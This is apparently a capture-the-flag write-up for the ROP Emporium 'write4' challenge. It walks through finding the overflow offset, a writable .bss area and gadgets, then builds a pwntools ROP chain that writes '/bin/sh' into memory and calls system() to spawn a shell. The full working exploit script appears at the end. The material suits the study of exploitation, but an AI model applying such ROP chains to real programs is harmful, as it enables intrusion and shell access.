The goal of the challenge is to master the writing in memory with ropchain. 
This time we want to write the string '*/bin/sh*' somewhere in memory. Then perform a system with this string as argument.
To do that we some ingredients:
- writeable memory area
- gadgets to write in memory
- gadgets to execute system()

As always running checksec we have:
```shell
[marco@marco-pc Downloads]$ checksec --file="write4"
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols     No	0		3	write4
```

Before build our ropchain let's see now many bytes there are until eip:
```gdb
[marco@marco-pc Downloads]$ gdb-pwndbg write4
Reading symbols from write4...
(No debugging symbols found in write4)
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
pwndbg> r
Starting program: /home/marco/Downloads/write4 
write4 by ROP Emporium
64bits

Go ahead and give me the string already!
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
...
 RBP  0x6161616a61616169 ('iaaajaaa')
...
pwndbg> cyclic -l 'iaaa'
32
```

Remember to add 8 byte of junk (32 byte to RBP , 40 to RIP)
With readelf we can explore memory sections marked as readable and their dimensions:
```shell
[marco@marco-pc Downloads]$ readelf -S write4
There are 31 section headers, starting at offset 0x1bf0:

Section Headers:
  [Nr] Name              Type             Address           Offset   Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000 0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238 000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254 0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274 0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298 0000000000000030  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002c8  000002c8 0000000000000120  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           00000000004003e8  000003e8 0000000000000074  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040045c  0000045c 0000000000000018  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400478  00000478 0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400498  00000498 0000000000000060  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000004004f8  000004f8 00000000000000a8  0000000000000018  AI       5    24     8
  [11] .init             PROGBITS         00000000004005a0  000005a0 000000000000001a  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004005c0  000005c0 0000000000000080  0000000000000010  AX       0     0     16
  [13] .plt.got          PROGBITS         0000000000400640  00000640 0000000000000008  0000000000000000  AX       0     0     8
  [14] .text             PROGBITS         0000000000400650  00000650 0000000000000252  0000000000000000  AX       0     0     16
  [15] .fini             PROGBITS         00000000004008a4  000008a4 0000000000000009  0000000000000000  AX       0     0     4
  [16] .rodata           PROGBITS         00000000004008b0  000008b0 0000000000000064  0000000000000000   A       0     0     8
  [17] .eh_frame_hdr     PROGBITS         0000000000400914  00000914 0000000000000044  0000000000000000   A       0     0     4
  [18] .eh_frame         PROGBITS         0000000000400958  000009580000000000000134  0000000000000000   A       0     0     8
  [19] .init_array       INIT_ARRAY       0000000000600e10  00000e10 0000000000000008  0000000000000000  WA       0     0     8
  [20] .fini_array       FINI_ARRAY       0000000000600e18  00000e18 0000000000000008  0000000000000000  WA       0     0     8
  [21] .jcr              PROGBITS         0000000000600e20  00000e20 0000000000000008  0000000000000000  WA       0     0     8
  [22] .dynamic          DYNAMIC          0000000000600e28  00000e28 00000000000001d0  0000000000000010  WA       6     0     8
  [23] .got              PROGBITS         0000000000600ff8  00000ff8 0000000000000008  0000000000000008  WA       0     0     8
  [24] .got.plt          PROGBITS         0000000000601000  00001000 0000000000000050  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000601050  00001050 0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000601060  00001060 0000000000000030  0000000000000000  WA       0     0     32
  [27] .comment          PROGBITS         0000000000000000  00001060 0000000000000034  0000000000000001  MS       0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  00001ae2 000000000000010c  0000000000000000           0     0     1
  [29] .symtab           SYMTAB           0000000000000000  00001098 0000000000000768  0000000000000018          30    50     8
  [30] .strtab           STRTAB           0000000000000000  00001800 00000000000002e2  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```
The bss section seems to be perfect! Now we need some gadgets to write in memory. 
Something like mov DWORD PTR [reg], reg; ret. In this case the program give us usefulGadget:
```gdb
[marco@marco-pc Downloads]$ gdb-pwndbg -q write4
Reading symbols from write4...
(No debugging symbols found in write4)
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> disassemble usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x0000000000400820 <+0>:	mov    QWORD PTR [r14],r15
   0x0000000000400823 <+3>:	ret    
   0x0000000000400824 <+4>:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x000000000040082e <+14>:	xchg   ax,ax
End of assembler dump.
```
Now let's retrive a gadget to pop arguments in r14, r15:
SOME gadgets:
```shell
[marco@marco-pc Downloads]$ ROPgadget --binary="write4" > gadgets
[marco@marco-pc Downloads]$ cat gadgets | grep pop
0x00000000004006ac : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006ae : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040069d : je 0x4006b8 ; pop rbp ; mov edi, 0x601060 ; jmp rax
0x00000000004006eb : je 0x400700 ; pop rbp ; mov edi, 0x601060 ; jmp rax
0x00000000004007ae : mov eax, 0 ; pop rbp ; ret
0x0000000000400815 : nop ; pop rbp ; ret
0x00000000004006a8 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004006f5 : nop dword ptr [rax] ; pop rbp ; ret
0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400892 : pop r15 ; ret
0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret
0x000000000040069f : pop rbp ; mov edi, 0x601060 ; jmp rax
0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop rbp ; ret
0x0000000000400893 : pop rdi ; ret
0x0000000000400891 : pop rsi ; pop r15 ; ret
0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006aa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
```
'pop r14 ; pop r15' fit perfectly for our purpose. To execute the write i wrote a dedicated function, which basically pad the string with null bytes until the length is a multiple of 8. 
Then cut the string in group by 8. And finally it writes 8 bytes at a time in memory adding 8 to the address for each write:
```python
def write_string_bss(mov_gadget, pop_gadget, bss_address, string):
    while len(string) % 8 != 0:
        string += "\x00"

    splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
    payload = "".encode()
    for i in range(len(splitted_string)):
        payload += p64(pop_gadget)
        payload += p64(bss_address + (i * 8))
        payload += splitted_string[i].encode()
        payload += p64(mov_gadget)
    return payload
```
To call *system* in 64 bit architecture, we need to pass the argument in rdi, so let's find a gadget:
```shell
[marco@marco-pc Downloads]$ cat gadgets | grep "pop rdi"
0x0000000000400893 : pop rdi ; ret
```
It's almost done. We just need a system to execute the syscall like in split challenge:
```gdb
[marco@marco-pc Downloads]$ gdb-pwndbg write4                                                   
Reading symbols from write4...                                                
(No debugging symbols found in write4)                                                          
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.                                  
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)                   
pwndbg> p system                                                                                
$1 = {<text variable, no debug info>} 0x4005e0 <system@plt>                                     
```

Final exploit:
```python
from pwn import *

string = "/bin/sh"
system = 0x4005e0
usefulGadgets = 0x0000000000400820 #QWORD PTR [r14],r15
pop_gadget = 0x0000000000400890 #pop r14 ; pop r15 ; ret
pop_rdi = 0x0000000000400893
bss_address = 0x0000000000601060


def write_string_bss(mov_gadget, pop_gadget, bss_address, string):
    while len(string) % 8 != 0:
        string += "\x00"

    splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
    payload = "".encode()
    for i in range(len(splitted_string)):
        payload += p64(pop_gadget)
        payload += p64(bss_address + (i * 8))
        payload += splitted_string[i].encode()
        payload += p64(mov_gadget)
    return payload

exploit = ("A"*40).encode()
exploit += write_string_bss(usefulGadgets, pop_gadget, bss_address, string)
exploit += p64(pop_rdi)
exploit += p64(bss_address)
exploit += p64(system)

p = process('./write4')
p.recvuntil('>')
p.sendline(exploit)
p.interactive()
```

